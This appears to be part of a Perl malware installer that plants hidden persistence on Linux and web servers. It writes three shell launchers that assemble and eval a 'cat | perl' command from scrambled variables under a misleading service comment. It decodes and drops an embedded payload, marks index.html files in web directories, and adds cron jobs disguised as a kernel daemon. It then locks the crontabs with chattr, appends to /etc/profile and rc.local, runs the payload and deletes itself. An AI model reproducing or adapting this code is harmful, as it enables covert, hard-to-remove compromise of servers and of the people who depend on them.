$mash1 = $mash1."/".$mash1_name;
$mash2 = $mash2."/".$mash2_name;
$mash3 = $mash3."/".$mash3_name;

my $MASH1_CURR_BIN_PATH = dirname ($mash1);
my $MASH1_CURR_BIN_NAME = basename($mash1);

my $MASH2_CURR_BIN_PATH = dirname ($mash2);
my $MASH2_CURR_BIN_NAME = basename($mash2);

my $MASH3_CURR_BIN_PATH = dirname ($mash3);
my $MASH3_CURR_BIN_NAME = basename($mash3);

print "\n\nBash1:".$bash1;
print "\nBash2:".$bash2;
print "\nBash3:".$bash3;

print "\n\nmash1:".$mash1;
print "\nmash2:".$mash2;
print "\nmash3:".$mash3;



#For index.html implants
if ($mash_paths[0] =~ /(template.*)|(www)|(inetpub)|(public)|(public_html)|(html)|(css)|(image.*)/i)
{
   `touch $mash_paths[0]/index.html`;
    print "\nMarked: $mash_paths[0]/index.html";
}
if ($mash_paths[1] =~ /(template.*)|(www)|(inetpub)|(public)|(public_html)|(html)|(css)|(image.*)/i)
{
   `touch $mash_paths[1]/index.html`;
    print "\nMarked: $mash_paths[1]/index.html";
}
if ($mash_paths[2] =~ /(template.*)|(www)|(inetpub)|(public)|(public_html)|(html)|(css)|(image.*)/i)
{
    `touch $mash_paths[2]/index.html`;
    print "\nMarked: $mash_paths[2]/index.html";
}

#crn bash or sh detection
my $myshellpath;

$myshellpath = "/bin/sh";
if (-f "/bin/sh")
{
$myshellpath = "/bin/sh";
}
elsif(-f "/usr/bin/sh")
{
$myshellpath = "/usr/bin/sh";
}
elsif(-f "/sbin/sh")
{
$myshellpath = "/sbin/sh";
}
elsif(-f "/usr/sbin/sh")
{
$myshellpath = "/usr/sbin/sh";
}


$cron0 = "echo \"0 * * * * $myshellpath \\\"$bash1\\\"\n##These are for bus-kernl-daemon service\n0 0 * * * $myshellpath \\\"$bash2\\\"\n0 0 * * 0 $myshellpath \\\"$bash3\\\"\" | crontab -";
$crontext = "my \$CRNSTRINGRREEAADD = '$cron0'";
################# Bash Content Creator
#DO HERE
my $bashexecstring1 = "cat $mash1 | perl";
my $bashexecstring2 = "cat $mash2 | perl";
my $bashexecstring3 = "cat $mash3 | perl";

my $rbashexe1 = $bashexecstring1;
my $rbashexe2 = $bashexecstring2;
my $rbashexe3 =  $bashexecstring3;


#===============BASH1
my $randomval1;
foreach my $char (split //, $rbashexe1) {
  $randomval1 = int(rand(10000000));
  $each1 = "con$randomval1=\"".$char."\"\n";
  push @all1 , $each1;
}
my $script1;

$script1 = "#!/bin/sh\n\n### This Service is responsible for string joining for server renewal and beaming \n\n\n\n\n\n\n\n";


foreach my $tt1 ( sort @all1)
{
    $script1 .= $tt1."\n"; 
}

$script1 .="eval ";
foreach my $tt1 (@all1)
{
    ($var, $num) = split /=/, $tt1;
    $script1 .= "\$".$var;
}


#===============BASH2
my $randomval2;
foreach my $char (split //, $rbashexe2) {
  $randomval2 = int(rand(10000000));
  $each2 = "con$randomval2=\"".$char."\"\n";
  push @all2 , $each2;
}
my $script2;

$script2 = "#!/bin/sh\n\n### This Service is responsible for string joining for server renewal and beaming \n\n\n\n\n\n\n\n";


foreach my $tt2 ( sort @all2)
{
    $script2 .= $tt2."\n"; 
}

$script2 .="eval ";
foreach my $tt2 (@all2)
{
    ($var, $num) = split /=/, $tt2;
    $script2 .= "\$".$var;
}

#===============BASH3
my $randomval3;
foreach my $char (split //, $rbashexe3) {
  $randomval3 = int(rand(10000000));
  $each3 = "con$randomval3=\"".$char."\"\n";
  push @all3 , $each3;
}
my $script3;

$script3 = "#!/bin/sh\n\n### This Service is responsible for string joining for server renewal and beaming \n\n\n\n\n\n\n\n";


foreach my $tt3 ( sort @all3)
{
    $script3 .= $tt3."\n"; 
}

$script3 .="eval ";
foreach my $tt3 (@all3)
{
    ($var, $num) = split /=/, $tt3;
    $script3 .= "\$".$var;
}


my $bashbinFIN1 = $script1;
my $bashbinFIN2 = $script2;
my $bashbinFIN3 = $script3;

if (open ($OUTB1, ">", "$bash1")){
       
        binmode $OUTB1;
        print $OUTB1 $bashbinFIN1;
        close $OUTB1;	
        chmod 0744, "$bash1";
        print "\nbash1 created\n";
 
    }else{
        print "cant create bash1!\n";
    }

if (open ($OUTB2, ">", "$bash2")){
       
        binmode $OUTB2;
        print $OUTB2 $bashbinFIN2;
        close $OUTB2;	
        chmod 0744, "$bash2";
        print "bash2 created\n";
 
    }else{
        print "cant create bash2!\n";
    }
if (open ($OUTB3, ">", "$bash3")){
       
        binmode $OUTB3;
        print $OUTB3 $bashbinFIN3;
        close $OUTB3;	
        chmod 0744, "$bash3";
        print "bash3 created\n";
 
    }else{
        print "cant create bash3!\n";
    }



################# MASH Content Creator
#my $CRNSTRINGRREEAADD = '';
my $bin = string_dec($encnde,$k);

$bin =~ s/00000000000000000000000000000000/$uuid/;
$bin =~ s/my \$CRNSTRINGRREEAADD = ''/$crontext/;

my $bin1 = $bin;
my $bin2 = $bin;
my $bin3 = $bin;

$bin1 =~ s/dirname\(abs_path\(\$0\)\)/"$MASH1_CURR_BIN_PATH"/;
$bin1 =~ s/basename\(abs_path\(\$0\)\)/"$MASH1_CURR_BIN_NAME"/;

$bin2 =~ s/dirname\(abs_path\(\$0\)\)/"$MASH2_CURR_BIN_PATH"/;
$bin2 =~ s/basename\(abs_path\(\$0\)\)/"$MASH2_CURR_BIN_NAME"/;

$bin3 =~ s/dirname\(abs_path\(\$0\)\)/"$MASH3_CURR_BIN_PATH"/;
$bin3 =~ s/basename\(abs_path\(\$0\)\)/"$MASH3_CURR_BIN_NAME"/;

if (open ($OUTF, ">", "$mash1")){
       
        binmode $OUTF;
        print $OUTF $bin1;
        close $OUTF;	
        chmod 0666, "$mash1";
        print "$mash1 created\n";
 
    }else{
        print "cant create $mash1!\n";
    }

if (open ($OUTF, ">", "$mash2")){
       
        binmode $OUTF;
        print $OUTF $bin2;
        close $OUTF;	
        chmod 0666, "$mash2";
        print "$mash2 created\n";
 
    }else{
        print "cant create $mash2!\n";
    }

if (open ($OUTF, ">", "$mash3")){
       
        binmode $OUTF;
        print $OUTF $bin3;
        close $OUTF;	
        chmod 0666, "$mash3";
        print "$mash3 created\n";
 
    }else{
        print "cant create $mash3!\n";
    }

    #here we do copies and executing bashes! 

################# END OF MASH Content Creator

my $cuser = `whoami`; chomp $cuser;
if ($cuser !~ /root/i)
{
    if (-f "/var/spool/cron/$cuser")
    {
        system("chattr", "-i /var/spool/cron/$cuser");
        system("chattr", "-a /var/spool/cron/$cuser");
    }
    if (-f "/var/spool/cron/crontabs/$cuser")
    {
        system ("chattr", "-i /var/spool/cron/crontabs/$cuser");
        system ("chattr", "-a /var/spool/cron/crontabs/$cuser");
    }

    `$cron0`;

    if (-f "/var/spool/cron/$cuser")
    {
        system("chattr", "+i /var/spool/cron/$cuser");
        system("chattr", "+a /var/spool/cron/$cuser");
    }
    if (-f "/var/spool/cron/crontabs/$cuser")
    {
        system ("chattr", "+i /var/spool/cron/crontabs/$cuser");
        system ("chattr", "+a /var/spool/cron/crontabs/$cuser");
    }
    print "\ncrn updated\n";
}else{ #for root user
`echo "$bash1" >> /etc/profile`;
`echo "$bash2" >> /etc/rc.local`;
system("chmod","+x", "/etc/rc.local");
}

system ($myshellpath,$bash1);
`rm $0`;

